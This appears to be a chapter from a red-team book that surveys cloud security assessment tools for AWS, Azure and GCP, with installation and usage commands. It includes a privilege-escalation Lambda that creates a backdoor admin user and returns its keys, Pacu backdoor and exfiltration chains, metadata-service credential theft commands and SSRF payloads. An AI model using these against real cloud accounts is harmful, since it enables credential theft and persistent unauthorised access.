# Chapter 25: Cloud Security Tools

![Cloud Security Assessment Framework](./images/cloud_security_framework.png)
*Figure 25.1: Cloud Security Assessment Framework showing attack vectors across infrastructure and services*

## Introduction to Cloud Security Assessment

Cloud environments represent one of the most significant shifts in modern infrastructure, necessitating specialized approaches to security testing. As organizations migrate critical workloads to cloud platforms, red teams must adapt their methodologies to effectively evaluate these complex, dynamic environments. This chapter explores comprehensive techniques for assessing security across major cloud service providers (AWS, Azure, GCP) and covers tools specifically designed for cloud security testing.

The cloud presents unique challenges for security assessments:

1. **Ephemeral Resources** - Infrastructure may be created and destroyed automatically
2. **API-Driven Architecture** - Service interactions occur primarily through API calls
3. **Shared Responsibility Model** - Security responsibilities are divided between the provider and customer
4. **Identity-Centric Security** - IAM permissions determine access to all resources
5. **Network Abstraction** - Traditional network scanning may not be effective

In red team operations, cloud assessments serve multiple purposes:
- Identifying initial access vectors into an organization's environment
- Discovering privilege escalation paths within cloud services
- Finding opportunities for lateral movement between services and accounts
- Locating exposed data and sensitive information
- Testing the effectiveness of cloud security controls and monitoring

For red teamers, effective cloud security assessments require a deep understanding of cloud-specific attack paths, privilege escalation techniques, and enumeration methodologies that differ significantly from traditional infrastructure assessment approaches.

## Multi-Cloud Assessment Tools

Before diving into platform-specific tools, several multi-cloud assessment frameworks provide value across different cloud environments.

### ScoutSuite: Multi-Cloud Security Auditing

ScoutSuite (formerly Scout2) provides comprehensive security auditing for AWS, Azure, GCP, and other cloud platforms through automated scanning and reporting.

#### Installation

```bash
# Using pip
pip install scoutsuite

# Using Git (for latest development version)
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
pip install -r requirements.txt
python setup.py install
```

#### Basic Usage

**AWS scanning:**
```bash
# Using AWS CLI credentials
scout aws --profile <profile-name>

# Scan specific services only
scout aws --services s3,ec2,iam

# Scan specific regions
scout aws --regions us-east-1,us-west-2

# Generate comprehensive report
scout aws --report-dir ./scout-report --no-browser
```

**Azure scanning:**
```bash
# Authenticate with Azure CLI first
az login

# Run ScoutSuite for Azure
scout azure --cli

# Limit to specific subscription
scout azure --subscriptions "Red Team Testing"
```

**GCP scanning:**
```bash
# Using GCP service account key
scout gcp --service-account /path/to/service-account.json

# User account authentication
scout gcp --user-account

# Focusing on specific project
scout gcp --project red-team-project
```

#### Understanding ScoutSuite Reports

ScoutSuite generates an HTML report with a comprehensive dashboard of findings:

1. **Service Map**: Visual representation of all services and their security status
2. **Findings Summary**: List of all issues grouped by severity
3. **Detailed Findings**: Specific issues with contextual information
4. **Remediation Guidance**: Suggested fixes for identified issues

#### Custom Rule Sets

Create your own rule sets for organization-specific requirements:

```bash
# Create a custom ruleset file (custom-rules.json)
cat > custom-rules.json << EOF
{
  "iam-password-policy-no-expiration": {
    "description": "Password expiration not enforced",
    "path": "iam.password_policy.expiry_requires_reset",
    "conditions": [ "false" ],
    "level": "danger"
  },
  "ec2-default-security-group-in-use": {
    "description": "Default security group in use",
    "path": "ec2.regions.id.vpcs.id.security_groups.id.name",
    "conditions": [ "equal", "default" ],
    "level": "warning"
  }
}
EOF

# Run ScoutSuite with custom rules
scout aws --ruleset custom-rules.json
```

#### Integration with Red Team Workflows

Integrate ScoutSuite findings into your broader assessment:

```bash
# 1. Run ScoutSuite first to identify misconfigurations
scout aws --profile target-environment --report-dir ./recon

# 2. Extract S3 buckets with issues for further testing
cat ./recon/scoutsuite-results/scoutsuite_results_aws-*.js | grep -o 's3-bucket-[a-zA-Z0-9\-]*' | sort -u > vulnerable_buckets.txt

# 3. Use findings to guide exploitation
while read bucket; do
  # Extract actual bucket name from finding ID
  bucket_name=$(echo $bucket | sed 's/s3-bucket-//g')
  # Test access to identified bucket
  aws s3 ls s3://$bucket_name --profile target-environment
done < vulnerable_buckets.txt
```

> **CASE STUDY: Cloud Reconnaissance During a Red Team Assessment**
> 
> During a red team engagement against a healthcare company in 2022, we obtained AWS API credentials through a Jenkins server exposed to the internet. Using these credentials with limited permissions, we ran ScoutSuite to identify the initial attack surface.
> 
> The scan revealed several critical issues:
> - Overly permissive S3 bucket permissions exposing patient records
> - EC2 instances with public IP addresses in a supposed "private" subnet
> - IAM policies with wildcards allowing privilege escalation
> 
> Using the ScoutSuite report as a guide, we exploited an IAM privilege escalation path to gain administrative access, extracted sensitive data from misconfigured S3 buckets, and accessed unpatched EC2 instances.
> 
> The automated scan provided in minutes what would have taken days to discover manually. The client particularly valued how we mapped findings to the specific AWS services and included recommended remediation actions from ScoutSuite's output.
> 
> *Source: Sanitized real-world red team engagement report, 2022*

### Cloudsploit: Open Source Cloud Security Scanner

CloudSploit, now part of Aqua Security, provides security scanning across cloud providers with focus on misconfigurations and compliance issues.

#### Installation

```bash
# Clone the repository
git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit
npm install

# Configure credentials
cp config_example.js config.js
nano config.js  # Edit with your cloud credentials
```

#### Basic Usage

```bash
# AWS scanning
./index.js --cloud aws --console none --compliance pci

# Export results to JSON for further processing
./index.js --cloud aws --json results.json

# Focus on specific plugins
./index.js --cloud aws --plugin ec2,iam,s3

# Azure scanning
./index.js --cloud azure --console none --compliance hipaa

# GCP scanning
./index.js --cloud google --console none --compliance cis
```

#### Understanding CloudSploit Results

CloudSploit results are organized by:

1. **Service**: AWS/Azure/GCP service (e.g., EC2, S3, VPC)
2. **Plugin**: Specific security check
3. **Status**: PASS, WARN, FAIL
4. **Resource**: Affected cloud resource
5. **Region**: Geographic location
6. **Description**: Details of the finding

```bash
# Example output format
# S3 Bucket Encryption
# FAIL: Bucket my-insecure-bucket does not have encryption enabled
# Region: us-east-1
# Resource: arn:aws:s3:::my-insecure-bucket
```

#### Continuous Scanning Implementation

For ongoing security validation, implement continuous scanning:

```bash
# Create a scanning script (scan.sh)
cat > scan.sh << 'EOF'
#!/bin/bash
# CloudSploit continuous scanning

# Define output directory
OUTPUT_DIR="/var/log/cloudsploit"
mkdir -p $OUTPUT_DIR

# Timestamp for files
TIMESTAMP=$(date +%Y%m%d-%H%M%S)

# Run scans
echo "Starting AWS scan..."
./index.js --cloud aws --json > $OUTPUT_DIR/aws-$TIMESTAMP.json

echo "Starting Azure scan..."
./index.js --cloud azure --json > $OUTPUT_DIR/azure-$TIMESTAMP.json

echo "Starting GCP scan..."
./index.js --cloud google --json > $OUTPUT_DIR/gcp-$TIMESTAMP.json

# Compare with previous scan to identify changes
PREV_AWS=$(ls -t $OUTPUT_DIR/aws-*.json | sed -n 2p)
if [ -n "$PREV_AWS" ]; then
  echo "Comparing with previous AWS scan..."
  diff <(jq -S . $OUTPUT_DIR/aws-$TIMESTAMP.json) <(jq -S . $PREV_AWS) > $OUTPUT_DIR/aws-diff-$TIMESTAMP.txt
fi

echo "Scans completed: $TIMESTAMP"
EOF

chmod +x scan.sh

# Add to crontab for regular execution
(crontab -l 2>/dev/null; echo "0 0 * * * cd /path/to/cloudsploit && ./scan.sh") | crontab -
```

### Prowler: AWS Security Assessment Tool

Prowler provides comprehensive security assessments for AWS environments with hundreds of checks based on AWS CIS Benchmark.

```bash
# Installation
pip install prowler

# Basic scan
prowler aws

# Scan specific categories
prowler aws -c s3 ec2 iam

# Generate detailed report
prowler aws -M csv json html -o report-output
```

**Customizing Prowler for Red Team Assessments:**

```bash
# Focus on exploitable misconfigurations
prowler aws -g group1_exploitable

# Check public exposure 
prowler aws -c extra729,extra769,extra770,extra771,extra772

# Check privilege escalation paths
prowler aws -c check111,check110,check113,check114,check115
```

## AWS Security Assessment Tools

Amazon Web Services (AWS) is the most widely used cloud provider and offers a vast array of services that require specialized security testing approaches.

### Pacu: AWS Exploitation Framework

Pacu is an open-source AWS exploitation framework designed specifically for red team operations.

#### Installation

```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip install -r requirements.txt

# Start Pacu
python3 pacu.py
```

#### Basic Usage

```bash
# Within Pacu shell
import_keys --profile default
run aws__enum_account
run aws__enum_iam
run aws__s3_bucket_dump
```

#### Reconnaissance Modules

Pacu includes numerous modules for AWS reconnaissance:

```bash
# Enumerate IAM users, roles, and policies
run iam__enum_users_roles_policies_groups

# Discover EC2 instances across all regions
run ec2__enum

# List S3 buckets and check permissions
run s3__enum

# Check for account-wide misconfigurations
run aws__enum_account
```

#### Privilege Escalation Techniques

Once initial access is established, Pacu facilitates privilege escalation:

```bash
# Find privilege escalation paths
run iam__privesc_scan

# Exploit trust relationships
run iam__assume_roles

# Enumerate permissions
run iam__enum_permissions
```

#### Advanced Pacu Modules for Exploitation

```bash
# Privilege escalation
run iam__privesc_scan
run iam__enum_roles_for_account

# Lateral movement
run lambda__backdoor_new_roles
run ec2__start_instances_ssm_sessions

# Data exfiltration
run s3__download_bucket
```

#### Building Attack Chains

Pacu's true power comes from chaining modules into complete attack paths:

```bash
# Sample attack chain for an AWS environment

# 1. Initial reconnaissance
run iam__enum_users_roles_policies_groups
run iam__enum_permissions

# 2. Identify vulnerable services
run s3__enum
run lambda__enum

# 3. Exploit vulnerabilities
run s3__download_bucket --bucket-name sensitive-data-bucket
run lambda__backdoor_function --function-name processing-function

# 4. Escalate privileges
run iam__privesc_scan
run iam__backdoor_assume_role

# 5. Further discovery with elevated privileges
run ec2__enum
run rds__enum

# 6. Maintain access
run iam__backdoor_users_keys
```

### AWS CLI for Security Assessment

The AWS CLI itself is a powerful tool for security assessment when used with the right commands and filters.

```bash
# List all S3 buckets and their policies
aws s3api list-buckets --query 'Buckets[*].Name' --output text | xargs -I {} aws s3api get-bucket-policy --bucket {} 2>/dev/null

# Find public EC2 instances
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table

# List IAM users and their access keys
aws iam list-users --query 'Users[*].[UserName,CreateDate]' --output table
aws iam list-users --query 'Users[*].UserName' --output text | xargs -I {} aws iam list-access-keys --user-name {}
```

**Advanced AWS CLI Security Checks:**

```bash
# Find Lambda functions with environment variables (potential secrets)
aws lambda list-functions | jq '.Functions[] | select(.Environment != null) | {FunctionName, Environment}'

# Check for unencrypted EBS volumes
aws ec2 describe-volumes --filters "Name=encrypted,Values=false" --query 'Volumes[*].[VolumeId,Size,State,CreateTime]' --output table

# Find IAM policies with wildcards
aws iam list-policies --scope Local --query 'Policies[*].[PolicyName,Arn]' --output text | while read -r name arn; do
  aws iam get-policy-version --policy-arn "$arn" --version-id $(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text) | jq -r '.PolicyVersion.Document.Statement[] | select(.Resource | type == "string" and contains("*"))'
done
```

### Specialized AWS Assessment Tools

#### S3Scanner: S3 Bucket Enumeration and Testing

S3 buckets represent one of the most common sources of data exposure in AWS environments. S3Scanner is a specialized tool for discovering and analyzing S3 buckets, helping red teams identify potentially exposed data.

##### Installation

```bash
# Clone the repository
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner
pip install -r requirements.txt
```

##### Basic Usage

```bash
# Scan a single bucket
python s3scanner.py --bucket company-backups

# Scan multiple buckets from a file
python s3scanner.py --bucket-list buckets.txt

# Generate a list of potential buckets
python s3scanner.py --gen-names company names.txt
```

##### Discovery Techniques

When targeting a specific organization, focus on likely bucket names:

```bash
# Create a wordlist of potential bucket names
cat > target-buckets.txt << EOF
company-name-prod
company-name-dev
company-name-test
company-name-staging
company-name-data
company-name-backup
company-name-archive
company-name-media
company-name-static
company-name-assets
EOF

# Scan the generated list
python s3scanner.py --bucket-list target-buckets.txt --out results.txt
```

##### Access Testing and Exploitation

Once potential buckets are identified, test their accessibility:

```bash
# Check permissions on discovered buckets
python s3scanner.py --bucket-list discovered.txt --check-perms --out permissions.txt

# Download files from accessible buckets
python s3scanner.py --bucket-list discovered.txt --download --out-dir ./exfiltrated
```

S3Scanner uses the following flags to indicate bucket permissions:

| Flag | Meaning | Exploitation Potential |
|------|---------|------------------------|
| READ | Public read access | Data exposure |
| WRITE | Public write access | Data tampering, malware hosting |
| EXIST | Bucket exists but access denied | Targeted brute force |
| ERROR | Error occurred in testing | Requires manual investigation |

##### Operational Workflow

A complete S3Scanner workflow might look like:

```bash
# 1. Generate potential bucket names
python s3scanner.py --gen-names targetcompany words.txt --out potential_buckets.txt

# 2. Check which buckets exist
python s3scanner.py --bucket-list potential_buckets.txt --out existing_buckets.txt

# 3. Test permissions on existing buckets
python s3scanner.py --bucket-list existing_buckets.txt --check-perms --out accessible_buckets.txt

# 4. List contents of readable buckets
python s3scanner.py --bucket-list accessible_buckets.txt --list --out bucket_contents.txt

# 5. Download sensitive files (selectively)
grep -E "password|credential|config|backup|database" bucket_contents.txt > sensitive_files.txt
python s3scanner.py --bucket-list accessible_buckets.txt --download --include-file sensitive_files.txt --out-dir ./exfiltrated
```

#### CloudSplaining: IAM Analysis

```bash
# Installation
pip install cloudsplaining

# Generate IAM report
aws iam get-account-authorization-details > authorization-details.json
cloudsplaining scan --input-file authorization-details.json

# Create HTML report
cloudsplaining scan --input-file authorization-details.json --output-directory cloudsplaining-report
```

#### CloudMapper: AWS Network Visualization

```bash
# Installation
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip install -r requirements.txt

# Collect AWS data
python3 collect.py --account <account_name>

# Generate network visualization
python3 prepare.py --account <account_name>
python3 webserver.py
```

### AWS Lambda Exploitation

AWS Lambda functions often have excessive IAM permissions that can be exploited:

#### LambdaGuard: Lambda Security Analysis

```bash
# Install LambdaGuard
pip install lambdaguard

# Scan Lambda functions
lambdaguard --profile red-team --out lambda-assessment

# Review findings
cat lambda-assessment/report.html
```

#### Lambda Privilege Escalation

If you have the ability to modify a Lambda function:

```python
# Malicious Lambda code for privilege escalation
import boto3
import json
import os

def lambda_handler(event, context):
    # Create a privileged IAM user
    iam = boto3.client('iam')
    
    try:
        # Create admin user
        iam.create_user(UserName='security_service')
        
        # Attach administrator policy
        iam.attach_user_policy(
            UserName='security_service',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        
        # Create access key
        response = iam.create_access_key(UserName='security_service')
        
        credentials = {
            'AccessKeyId': response['AccessKey']['AccessKeyId'],
            'SecretAccessKey': response['AccessKey']['SecretAccessKey']
        }
        
        print(json.dumps(credentials))
        return credentials
        
    except Exception as e:
        print(e)
        return {
            'statusCode': 500,
            'body': str(e)
        }
```

Deploy this code to a Lambda function with IAM permissions, then invoke it to create a privileged user.

### EC2 Metadata Service Exploitation

The EC2 Instance Metadata Service (IMDS) can be leveraged for credential theft:

```bash
# Access instance metadata (IMDSv1)
curl http://169.254.169.254/latest/meta-data/

# Extract IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

For IMDSv2, which uses token-based sessions:

```bash
# Request session token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for metadata requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### AWS SSRF Vulnerabilities

Server-Side Request Forgery (SSRF) vulnerabilities can be exploited to access the metadata service from a vulnerable application:

```bash
# Example SSRF payload targeting metadata service
https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# If IMDSv2 is enforced, a chained exploit is needed:
# 1. First request to get token
https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/api/token

# 2. Second request using the token
https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&token=TOKEN_VALUE
```

### CloudGoat: AWS Exploitation Practice Environment

For ethical practice of AWS exploitation techniques:

```bash
# Install CloudGoat
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip install -r requirements.txt

# Configure AWS credentials for deployment
./cloudgoat.py config

# Deploy a scenario
./cloudgoat.py create iam_privesc_by_attachment

# Start testing against the scenario
# Use tools like Pacu against the created environment

# When finished, destroy the resources
./cloudgoat.py destroy iam_privesc_by_attachment
```

CloudGoat provides multiple scenarios for practicing different AWS attack vectors in a controlled environment.

### AWS Post-Exploitation Framework (PEF)

AWS Post-Exploitation Framework automates common post-exploitation activities:

```bash
# Clone the repository
git clone https://github.com/andresriancho/aws-pef
cd aws-pef

# Install dependencies
pip install -r requirements.txt

# Run the default post-exploitation chain
python main.py --access-key AKIA... --secret-key abcd1234...

# Specify custom chain
python main.py --access-key AKIA... --secret-key abcd1234... --chain persistence
```

## Azure Security Assessment Tools

Microsoft Azure presents unique security challenges with its ecosystem of services and authentication mechanisms.

### MicroBurst: Azure Security Assessment Framework

MicroBurst is a PowerShell toolkit for Azure reconnaissance and enumeration.

```powershell
# Import the module
Import-Module .\MicroBurst.psm1

# Azure reconnaissance
Get-AzureDomainInfo -Domain targetorganization.com

# Storage account enumeration and data access
Invoke-EnumerateAzureBlobs -Base targetorg

# Find available virtual machines
Get-MBVMInfo

# Check for readable key vaults
Invoke-EnumerateAzureKeyVaults
```

**Advanced MicroBurst Techniques:**

```powershell
# Function App reconnaissance
Get-MBAzureFunctionApps

# Search for passwords in automation accounts
Get-MBAzureRunAsAccounts

# Extract secrets from App Services
Get-MBAzureWebAppSecretsREST
```

### Stormspotter: Azure Infrastructure Visualization

Stormspotter provides visual analysis of Azure environments for security assessment.

```bash
# Clone the repository
git clone https://github.com/Azure/Stormspotter.git
cd Stormspotter

# Start the backend
cd backend
docker-compose up -d

# Run the collector
cd ../stormcollector
python3 sspcollector.py -u

# Access the frontend
# Navigate to http://localhost:9091
```

### Azure CLI for Security Assessment

The Azure CLI provides powerful capabilities for security assessment when used with the right queries and filters.

```bash
# List all resources
az resource list --output table

# Find public blob containers
az storage account list --query '[*].[name,allowBlobPublicAccess]' --output table

# Check network security groups with open ports
az network nsg list --query "[].security_rules[?access=='Allow' && direction=='Inbound' && source_address_prefix=='*']" --output table
```

**Advanced Azure CLI Security Queries:**

```bash
# Find service principals with certificates
az ad sp list --all --query "[?servicePrincipalType=='Application' && keyCredentials[?usage=='Verify']].[displayName,appId]" --output table

# List Key Vault access policies
az keyvault list --query "[].{Name:name, ResourceGroup:resourceGroup}" --output table | while read name rg; do
  az keyvault show -n $name -g $rg --query "properties.accessPolicies[].{ObjectId:objectId,Permissions:permissions}" --output table
done

# Find managed identities with permissions
az identity list --query "[].{Name:name,ResourceGroup:resourceGroup,PrincipalId:principalId}" --output table
```

### AzureHound: Active Directory and Azure Security Assessment

```bash
# Clone BloodHound repository
git clone https://github.com/BloodHoundAD/BloodHound.git
cd BloodHound

# Collect Azure data
cd Collectors
./AzureHound.ps1

# Import data into BloodHound
# Start BloodHound and upload the JSON files

# Query for high-risk attack paths
// Find paths to Global Administrators
MATCH p=shortestPath((u:User)-[r*1..]->(m:AZUser {aadRole:'Global Administrator'}))
RETURN p
```

### Azurite: Azure Storage Emulator for Testing

```bash
# Installation
npm install -g azurite

# Start Azurite
azurite --silent --location data --debug debug.log

# Access storage accounts with a modified connection string
az storage blob list --connection-string "DefaultEndpointsProtocol=http;AccountName=devstoreaccount1;AccountKey=Eby8vdM...;BlobEndpoint=http://127.0.0.1:10000/devstoreaccount1;"
```

![Azure Attack Paths](./images/azure_attack_paths.png)
*Figure 25.2: Common Azure attack paths highlighting identity-based privilege escalation routes*

## GCP Security Assessment Tools

Google Cloud Platform (GCP) requires specialized approaches for effective security assessment.

### GCP IAM Analyzer

```bash
# Installation
pip install gcp-iam-analyzer

# Export IAM policy
gcloud projects get-iam-policy <project-id> > iam-policy.json

# Analyze IAM policy
gcp-iam-analyzer analyze --policy iam-policy.json

# Check for privilege escalation paths
gcp-iam-analyzer escalate --policy iam-policy.json
```

### G-Scout: GCP Security Auditing Tool

```bash
# Clone the repository
git clone https://github.com/nccgroup/G-Scout.git
cd G-Scout

# Set up authentication
gcloud auth application-default login
export GOOGLE_APPLICATION_CREDENTIALS=/path/to/credentials.json

# Run the scan
python3 gscout.py -p <project-id>
```

### GCP CLI (gcloud) for Security Assessment

The gcloud CLI provides powerful features for security assessment of GCP environments.

```bash
# List all projects
gcloud projects list

# Enumerate IAM permissions
gcloud projects get-iam-policy <project-id>

# List public GCS buckets
gsutil ls -L gs://<bucket-name> | grep -A 1 "ACL"

# Check firewall rules
gcloud compute firewall-rules list --format="table(name,network,direction,sourceRanges.list():label=SRC_RANGES,destinationRanges.list():label=DEST_RANGES,allowed[].map().firewall_rule().list():label=ALLOW,denied[].map().firewall_rule().list():label=DENY)"
```

**Advanced GCP Security Checks:**

```bash
# Find service accounts with keys
gcloud iam service-accounts list --format="table(email)"

# List Compute Engine instances with public IPs
gcloud compute instances list --format="table(name,networkInterfaces[0].accessConfigs[0].natIP,status)"

# Check for public Cloud Storage buckets
gsutil ls | xargs -I{} gsutil iam get {} | grep "allUsers"

# Identify GKE clusters with public access
gcloud container clusters list --format="table(name,endpoint,masterAuthorizedNetworksConfig.cidrBlocks.cidrBlock)"
```

## Comprehensive Cloud Security Assessment Methodology

A structured approach to cloud security assessment ensures thorough coverage and maximizes the value of red team operations.

### 1. Reconnaissance and Enumeration

```bash
# Use multi-cloud tools for initial discovery
scout aws --report-dir ./aws-recon
scout azure --report-dir ./azure-recon
scout gcp --report-dir ./gcp-recon

# Process findings for further analysis
grep -r "CRITICAL" ./aws-recon > critical_aws_findings.txt
grep -r "HIGH" ./azure-recon > high_azure_findings.txt
```

### 2. Permission Analysis

```bash
# AWS IAM analysis
cloudsplaining scan --input-file aws-iam-details.json

# Azure RBAC analysis
az role assignment list --include-inherited --include-groups --output json > azure_rbac.json

# GCP IAM analysis
gcp-iam-analyzer analyze --policy gcp-iam-policy.json
```

### 3. Exploitation and Privilege Escalation

```bash
# Import discovered credentials into Pacu
python3 pacu.py
import_keys --profile discovered_aws_creds

# Scan for privilege escalation paths
run iam__privesc_scan

# Execute identified privilege escalation techniques
run iam__backdoor_users_keys --usernames admin-user
```

### 4. Data Discovery and Exfiltration

```bash
# Scan for exposed data in AWS
python s3scanner.py --bucket-list discovered_buckets.txt --check-perms

# Azure storage account analysis
az storage blob list --account-name <storage-account> --output json > azure_blobs.json

# GCP storage bucket analysis
for bucket in $(gsutil ls); do
  gsutil ls -r $bucket > gcp_bucket_contents.txt
done
```

### 5. Reporting and Documentation

Document findings with:
- Service-specific vulnerabilities
- Privilege escalation paths
- Exposed data and sensitive information
- Identity and access management issues
- Potential persistence mechanisms
- Recommendations for remediation

## Conclusion

Cloud security assessment tools provide specialized capabilities for evaluating increasingly complex and critical cloud infrastructure. The multi-cloud and provider-specific tools covered in this chapter form a comprehensive toolkit for red teams to effectively test an organization's cloud security posture.

When conducting cloud security assessments, remember these key principles:

1. **Identity is the New Perimeter** - Focus on IAM permissions, roles, and trust relationships
2. **API-Driven Attacks** - Most cloud exploits leverage the API rather than traditional network vectors
3. **Configuration Over Vulnerabilities** - Misconfigurations typically present more risk than software flaws
4. **Privilege Escalation Paths** - Look for complex chains that combine multiple permissions
5. **Data-Oriented Approach** - Identify and target sensitive data across all storage services

As organizations continue to migrate to the cloud, these tools and techniques will become increasingly central to effective red team operations. By systematically assessing cloud environments using the approaches outlined in this chapter, red teams can provide valuable insights into cloud security risks before malicious actors can exploit them.

## Additional Resources

1. [ScoutSuite Documentation](https://github.com/nccgroup/ScoutSuite/wiki)
2. [Pacu Wiki](https://github.com/RhinoSecurityLabs/pacu/wiki)
3. [CloudSploit Scans](https://github.com/aquasecurity/cloudsploit/tree/master/plugins)
4. [S3Scanner Repository](https://github.com/sa7mon/S3Scanner)
5. [AWS Penetration Testing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
6. [CloudGoat Scenarios](https://github.com/RhinoSecurityLabs/cloudgoat#scenarios)
7. [Azure Security Best Practices](https://docs.microsoft.com/en-us/azure/security/fundamentals/best-practices-and-patterns)
8. [GCP Security Best Practices](https://cloud.google.com/security/best-practices)
9. [OWASP Cloud Security Project](https://owasp.org/www-project-cloud-security/)
10. [Cloud Security Alliance Guidance](https://cloudsecurityalliance.org/research/guidance/)
